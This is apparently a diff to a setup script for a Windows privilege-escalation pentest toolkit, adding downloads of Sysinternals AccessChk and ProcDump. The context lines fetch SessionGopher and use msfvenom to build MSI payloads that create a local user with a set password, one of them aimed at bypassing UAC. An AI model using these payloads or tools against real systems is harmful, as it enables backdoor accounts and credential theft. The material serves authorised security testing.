@@ -45,6 +45,8 @@
 # - Get-LAPSPasswords.ps1
 # - SessionGopher.ps1
 # - Akagi (UACMe)
+# - AccessChk
+# - ProcDump
 
 #sudo apt install -y powersploit peass windows-binaries
 
@@ -140,6 +142,10 @@ wget https://raw.githubusercontent.com/Arvanaghi/SessionGopher/master/SessionGop
 wget https://download.sysinternals.com/files/AccessChk.zip
 unzip AccessChk.zip
 rm -f Eula.txt
+wget https://download.sysinternals.com/files/Procdump.zip
+unzip Procdump.zip
+rm -f Eula.txt
+
 
 msfvenom -p windows/adduser USER=nqqb PASS=P@ssword123! -f msi-nouac -o alwe-nouac.msi #No uac format
 msfvenom -p windows/adduser USER=nqqb PASS=P@ssword123! -f msi -o alwe.msi #Using the msiexec the uac wont be prompted
